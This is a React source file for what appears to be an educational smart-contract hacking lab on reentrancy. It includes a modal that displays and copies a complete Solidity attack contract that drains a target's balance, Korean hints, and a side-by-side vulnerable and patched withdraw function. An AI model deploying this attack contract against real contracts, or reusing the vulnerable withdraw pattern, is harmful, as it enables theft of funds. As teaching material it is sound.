'use client'

import React, { useState, useEffect, useRef } from 'react'
import {
  Copy,
  Terminal,
  ShieldAlert,
  CheckCircle,
  HelpCircle,
  X,
  Code,
  Lock,
} from 'lucide-react'
import { Prism as SyntaxHighlighter } from 'react-syntax-highlighter'
import { vscDarkPlus } from 'react-syntax-highlighter/dist/esm/styles/prism'
import { motion, AnimatePresence } from 'framer-motion'

// 1. Matrix Background Effect
export const MatrixRain = () => {
  const canvasRef = useRef<HTMLCanvasElement>(null)

  useEffect(() => {
    const canvas = canvasRef.current
    if (!canvas) return
    const ctx = canvas.getContext('2d')
    if (!ctx) return

    canvas.width = window.innerWidth
    canvas.height = window.innerHeight

    const chars = '01'
    const fontSize = 14
    const columns = canvas.width / fontSize
    const drops: number[] = []

    for (let i = 0; i < columns; i++) {
      drops[i] = 1
    }

    const draw = () => {
      ctx.fillStyle = 'rgba(2, 6, 23, 0.05)' // Fade effect
      ctx.fillRect(0, 0, canvas.width, canvas.height)
      ctx.fillStyle = '#0f0' // Green text
      ctx.font = `${fontSize}px monospace`

      for (let i = 0; i < drops.length; i++) {
        const text = chars.charAt(Math.floor(Math.random() * chars.length))
        ctx.fillText(text, i * fontSize, drops[i] * fontSize)

        if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
          drops[i] = 0
        }
        drops[i]++
      }
    }

    const interval = setInterval(draw, 33)
    const handleResize = () => {
      canvas.width = window.innerWidth
      canvas.height = window.innerHeight
    }
    window.addEventListener('resize', handleResize)

    return () => {
      clearInterval(interval)
      window.removeEventListener('resize', handleResize)
    }
  }, [])

  return (
    <canvas
      ref={canvasRef}
      className="fixed inset-0 z-0 opacity-20 pointer-events-none"
    />
  )
}

// 2. Copy Button Component
export const CopyButton = ({
  text,
  label = '',
}: {
  text: string
  label?: string
}) => {
  const [copied, setCopied] = useState(false)

  const handleCopy = () => {
    navigator.clipboard.writeText(text)
    setCopied(true)
    setTimeout(() => setCopied(false), 2000)
  }

  return (
    <button
      onClick={handleCopy}
      className="flex items-center gap-2 text-xs text-green-500 hover:text-white transition-colors"
      title="Copy to Clipboard"
    >
      {copied ? <CheckCircle size={14} /> : <Copy size={14} />}
      {label && <span>{copied ? 'COPIED!' : label}</span>}
    </button>
  )
}

// 3. Attack Code Template Modal
export const AttackCodeModal = ({
  isOpen,
  onClose,
  targetAddress,
}: {
  isOpen: boolean
  onClose: () => void
  targetAddress: string
}) => {
  if (!isOpen) return null

  const code = `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint _amount) external;
}

contract Attack {
    IReentrance public target;
    uint constant public AMOUNT = 0.001 ether;

    constructor(address _targetAddr) {
        target = IReentrance(_targetAddr);
    }

    function attack() external payable {
        require(msg.value >= AMOUNT, "Need ETH to attack");
        target.donate{value: AMOUNT}(address(this));
        target.withdraw(AMOUNT);
    }

    receive() external payable {
        uint targetBalance = address(target).balance;
        if (targetBalance >= AMOUNT) {
            target.withdraw(AMOUNT);
        }
    }
    
    // Function to retrieve stolen funds
    function withdrawStolen() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}`

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-sm p-4">
      <div className="bg-slate-900 border border-green-500 w-full max-w-2xl max-h-[80vh] overflow-hidden rounded-lg flex flex-col shadow-[0_0_30px_rgba(0,255,0,0.2)]">
        <div className="flex justify-between items-center p-4 border-b border-green-800 bg-slate-950">
          <h3 className="text-lg font-bold text-white flex items-center gap-2">
            <Terminal size={18} /> ATTACK_VECTOR_TEMPLATE.sol
          </h3>
          <button onClick={onClose} className="text-slate-400 hover:text-white">
            <X />
          </button>
        </div>
        <div className="p-4 overflow-y-auto custom-scrollbar flex-1 bg-[#1e1e1e]">
          <SyntaxHighlighter
            language="solidity"
            style={vscDarkPlus}
            showLineNumbers
          >
            {code}
          </SyntaxHighlighter>
        </div>
        <div className="p-4 border-t border-green-800 bg-slate-950 flex justify-end gap-3">
          <div className="text-xs text-slate-400 self-center mr-auto">
            * Target:{' '}
            {targetAddress
              ? `${targetAddress.slice(0, 6)}...${targetAddress.slice(-4)}`
              : 'NOT_SET'}
          </div>
          <button
            onClick={() => {
              navigator.clipboard.writeText(code)
              alert('Code copied to clipboard!')
            }}
            className="px-4 py-2 bg-green-700 hover:bg-green-600 text-white font-bold rounded flex items-center gap-2"
          >
            <Copy size={16} /> COPY CODE
          </button>
        </div>
      </div>
    </div>
  )
}

// 4. Secure Code Comparison (Educational)
export const SecureCodeComparison = () => {
  const [activeTab, setActiveTab] = useState<'vulnerable' | 'secure'>(
    'vulnerable'
  )

  const vulnerable = `function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
        // ❌ BAD: Interaction before Effect
        (bool result,) = msg.sender.call{value:_amount}("");
        require(result);
        
        unchecked { 
            balances[msg.sender] -= _amount; 
        }
    }
}`

  const secure = `function withdraw(uint _amount) public {
    // 1. Checks
    require(balances[msg.sender] >= _amount);

    // 2. Effects (Update state first!)
    balances[msg.sender] -= _amount;

    // 3. Interactions (Send Ether last)
    (bool result,) = msg.sender.call{value:_amount}("");
    require(result);
}`

  return (
    <div className="border border-slate-700 rounded-lg overflow-hidden bg-black mt-4">
      <div className="flex border-b border-slate-700">
        <button
          onClick={() => setActiveTab('vulnerable')}
          className={`flex-1 py-2 text-sm font-bold flex items-center justify-center gap-2 ${
            activeTab === 'vulnerable'
              ? 'bg-red-900/20 text-red-400 border-b-2 border-red-500'
              : 'text-slate-500 hover:text-slate-300'
          }`}
        >
          <ShieldAlert size={14} /> Vulnerable
        </button>
        <button
          onClick={() => setActiveTab('secure')}
          className={`flex-1 py-2 text-sm font-bold flex items-center justify-center gap-2 ${
            activeTab === 'secure'
              ? 'bg-green-900/20 text-green-400 border-b-2 border-green-500'
              : 'text-slate-500 hover:text-slate-300'
          }`}
        >
          <Lock size={14} /> Secure (Patched)
        </button>
      </div>
      <div className="p-2">
        <SyntaxHighlighter
          language="solidity"
          style={vscDarkPlus}
          customStyle={{ background: 'transparent', fontSize: '12px' }}
        >
          {activeTab === 'vulnerable' ? vulnerable : secure}
        </SyntaxHighlighter>
      </div>
    </div>
  )
}

// 5. Hint System
export const HintSystem = () => {
  const [step, setStep] = useState(0)

  const hints = [
    "힌트 1: withdraw 함수의 '순서'를 자세히 살펴보세요.",
    '힌트 2: 이더를 전송하는 .call() 이 실행될 때, 수신자(공격자)는 코드를 실행할 수 있습니다.',
    '힌트 3: 잔액(balance)이 차감되기 전에 다시 withdraw를 호출하면 어떻게 될까요?',
  ]

  return (
    <div className="mt-4 p-4 border border-yellow-800/50 bg-yellow-900/10 rounded">
      <div className="flex justify-between items-center mb-2">
        <h4 className="text-yellow-500 font-bold flex items-center gap-2 text-sm">
          <HelpCircle size={16} /> HINT_MODULE ({step}/{hints.length})
        </h4>
        {step < hints.length && (
          <button
            onClick={() => setStep((s) => s + 1)}
            className="text-xs border border-yellow-700 px-2 py-1 text-yellow-500 hover:bg-yellow-900"
          >
            REVEAL NEXT
          </button>
        )}
      </div>
      <div className="space-y-2">
        {hints.slice(0, step).map((h, i) => (
          <motion.div
            key={i}
            initial={{ opacity: 0, x: -10 }}
            animate={{ opacity: 1, x: 0 }}
            className="text-sm text-slate-300 bg-black/50 p-2 rounded border-l-2 border-yellow-600"
          >
            {h}
          </motion.div>
        ))}
        {step === 0 && (
          <p className="text-xs text-slate-600 italic">
            시스템 분석이 필요하면 힌트를 요청하십시오.
          </p>
        )}
      </div>
    </div>
  )
}

// 6. Typewriter Effect Text
export const Typewriter = ({
  text,
  delay = 50,
}: {
  text: string
  delay?: number
}) => {
  const [currentText, setCurrentText] = useState('')
  const [currentIndex, setCurrentIndex] = useState(0)

  useEffect(() => {
    if (currentIndex < text.length) {
      const timeout = setTimeout(() => {
        setCurrentText((prevText) => prevText + text[currentIndex])
        setCurrentIndex((prevIndex) => prevIndex + 1)
      }, delay)

      return () => clearTimeout(timeout)
    }
  }, [currentIndex, delay, text])

  return <span>{currentText}</span>
}
